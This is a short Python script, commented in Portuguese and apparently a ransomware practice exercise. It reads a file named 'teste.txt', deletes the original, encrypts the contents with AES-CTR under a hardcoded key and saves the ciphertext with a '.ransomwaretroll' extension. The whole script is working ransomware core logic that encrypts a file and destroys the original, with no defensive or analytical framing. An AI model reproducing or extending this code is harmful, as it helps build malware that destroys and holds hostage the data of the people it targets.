import os
import pyaes

#abrir arquivo para criptografar
file_name  = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

#remover o arquivo original
os.remove(file_name)

#definindo a chave de encriptação
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

#criptografando o arquivo
encrypt_data = aes.encrypt(file_data)

#salvando o arquivo
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(encrypt_data)
new_file.close()
